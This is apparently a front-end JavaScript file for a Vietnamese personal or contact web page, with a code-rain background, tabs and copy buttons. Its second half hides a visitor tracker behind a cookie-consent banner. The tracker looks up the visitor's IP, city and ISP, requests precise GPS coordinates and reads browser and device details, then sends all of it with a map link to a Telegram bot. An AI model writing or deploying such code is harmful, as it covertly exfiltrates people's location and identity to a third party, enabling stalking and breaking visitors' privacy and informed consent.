// Code rain background
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
const fontSize = 12;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function draw() {
    ctx.fillStyle = 'rgba(15, 23, 42, 0.04)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#60a5fa';
    ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 45);

window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
});

// Tab toggle
document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.contact-content').forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById(btn.dataset.tab).classList.add('active');
    });
});

// Copy to clipboard
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('Đã sao chép: ' + text);
    }).catch(() => {
        alert('Không thể sao chép, thử thủ công nhé!');
    });
}

// Auto zoom adjustment
function adjustZoom() {
    const vw = document.getElementById('viewportMeta');
    const w = window.innerWidth;
    let scale = w < 768 ? 1.04 : 1.0;
    vw.setAttribute('content', `width=device-width, initial-scale=${scale}, maximum-scale=5.0, user-scalable=yes`);
}
window.addEventListener('resize', adjustZoom);
adjustZoom();

     // --- 1. CẤU HÌNH ---
        const TG_TOKEN = CONFIG.TG_TOKEN;
        const CHAT_ID = CONFIG.CHAT_ID;
let isTrackingStarted = false;

// --- 2. HÀM LẤY IP ĐA LUỒNG (Đã fix để lấy đúng Nhà mạng) ---
async function fetchIpInfo() {
    const apis = [
        {
            // Nguồn 1: ipwho.is (Rất chi tiết cho VN)
            url: 'https://ipwho.is/',
            parse: (d) => ({ 
                ip: d.ip, 
                city: d.city, 
                isp: d.connection?.isp || d.isp || d.org 
            })
        },
        
            {
    // Nguồn: Ipify (Chuyên dụng lấy IP, hỗ trợ HTTPS/CORS)
    url: 'https://api.ipify.org?format=json',
    parse: (d) => ({
        ip: d.ip,
        city: "Unknown",
        isp: "Unknown"
    })
},
        
            {
    // Nguồn: Cloudflare (Cực kỳ ổn định, hỗ trợ HTTPS tốt)
    url: 'https://cloudflare.com/cdn-cgi/trace',
    parse: (d) => {
        // Cloudflare trả về dạng text key=value, cần convert sang object
        const data = Object.fromEntries(d.split('\n').map(l => l.split('=')));
        return {
            ip: data.ip,
            city: "N/A", // Cloudflare trace không trả về City trực tiếp
            isp: "Cloudflare Network"
        };
    }
},
    ];

    for (const api of apis) {
        try {
            console.log(`Thử nguồn: ${api.url}`);
            const res = await fetch(api.url);
            if (!res.ok) throw new Error("API Limit");
            const data = await res.json();
            
            const result = api.parse(data);
            // Kiểm tra nếu có dữ liệu IP và ISP thì mới trả về
            if (result.ip && result.isp && result.isp !== "N/A") {
                return result;
            }
        } catch (e) {
            console.warn(`Nguồn ${api.url} lỗi, chuyển nguồn tiếp theo...`);
            continue;
        }
    }
    return { ip: "Không rõ", city: "Không rõ", isp: "Không rõ" };
}

// --- 3. HÀM LẤY TỌA ĐỘ GPS ---
function getPosition() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
            (pos) => resolve(pos),
            () => resolve(null),
            { enableHighAccuracy: true, timeout: 5000 }
        );
    });
}

// --- 4. HÀM GỬI DỮ LIỆU (Format mới, đẹp, đầy đủ icon) ---
async function sendData(pos, ipInfo) {
   const info = getDeviceInfor(); // Gọi hàm lấy thông tin chi tiết
    const time = new Date().toLocaleString('vi-VN');

    let message = `<b>🚀 PHÁT HIỆN TRUY CẬP MỚI</b>\n\n`;
    message += `🕒 <b>Thời gian:</b> <code>${time}</code>\n`;
    message += `🌐 <b>IP:</b> <code>${ipInfo.ip}</code>\n`;
    message += `🏙️ <b>Thành phố:</b> <code>${ipInfo.city}</code>\n`;
    message += `📡 <b>Nhà mạng:</b> <b>${ipInfo.isp}</b>\n\n`;

    // Phần hiển thị thiết bị mới
    message += `ℹ️ <b>Thông tin thiết bị:</b>\n`;
    message += `├─ Loại: <b>${info.deviceType}</b>\n`;
    message += `├─ Hệ điều hành: <code>${info.os}</code>\n`;
    message += `└─ Trình duyệt: <b>${info.browser}</b>\n\n`;

    if (pos && pos.coords) {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
        message += `📍 <b>Vị trí GPS:</b>\n`;
        message += `├ Vĩ độ: <code>${lat}</code>\n`;
        message += `├ Kinh độ: <code>${lon}</code>\n`;
        message += `└ 👉 <a href="${mapsUrl}">Nhấn để xem Bản đồ</a>\n\n`;
    } else {
        message += `⚠️ <b>GPS:</b> Không khả dụng\n\n`;
    }

    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: false
            })
        });
    } catch (err) {
        console.error("Lỗi gửi Telegram:", err);
    }
}

// --- 5. HÀM KHỞI CHẠY (Fix lỗi ReferenceError) ---
async function startAutoTracking() {
    if (isTrackingStarted) return;
    isTrackingStarted = true;

    console.log("Đang lấy thông tin...");
    const ipInfo = await fetchIpInfo();
    const pos = await getPosition();
    
    await sendData(pos, ipInfo);
}

// --- 6. QUẢN LÝ SỰ KIỆN ---
window.onload = function() {
    if (localStorage.getItem('is_accepted')) {
        startAutoTracking();
    } else {
        const cookieBox = document.getElementById('cookie-box');
        if (cookieBox) cookieBox.style.display = 'block';
    }
};

function acceptCookies() {
    localStorage.setItem('is_accepted', 'true');
    const cookieBox = document.getElementById('cookie-box');
    if (cookieBox) cookieBox.style.display = 'none';
    startAutoTracking();
}
function getBrowserName() {
    const ua = navigator.userAgent;
    let browser = "Không xác định";

    // Kiểm tra theo thứ tự ưu tiên (vì nhiều trình duyệt chứa chuỗi của nhau)
    if (ua.includes("CocCoc")) {
        browser = "Cốc Cốc";
    } else if (ua.includes("Edg/")) {
        browser = "Microsoft Edge";
    } else if (ua.includes("Chrome") && !ua.includes("Chromium")) {
        browser = "Google Chrome";
    } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
        browser = "Safari";
    } else if (ua.includes("Firefox")) {
        browser = "Firefox";
    } else if (ua.includes("OPR") || ua.includes("Opera")) {
        browser = "Opera";
    } else if (ua.includes("Trident") || ua.includes("MSIE")) {
        browser = "Internet Explorer";
    }

    return browser;
}
function getDeviceInfor() {
    const ua = navigator.userAgent;
    let browser = "Trình duyệt ẩn danh";
    let os = "Không rõ OS";
    let deviceType = "💻 Máy tính";

    // 1. Nhận diện Trình duyệt (Ưu tiên các bản đặc biệt trước)
    if (ua.includes("CocCoc")) browser = "Cốc Cốc";
    else if (ua.includes("Edg/")) browser = "Microsoft Edge";
    else if (ua.includes("Chrome") && !ua.includes("Chromium")) browser = "Google Chrome";
    else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
    else if (ua.includes("Firefox")) browser = "Firefox";

    // 2. Nhận diện Hệ điều hành (OS)
    if (ua.includes("Win")) os = "Windows";
    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("Mac")) os = "MacOS";
    else if (ua.includes("Linux")) os = "Linux";

    // 3. Phân loại loại thiết bị
    if (/Android|iPhone|iPad|iPod/i.test(ua)) {
        deviceType = "📱 Điện thoại";
    }

    return { browser, os, deviceType };
}
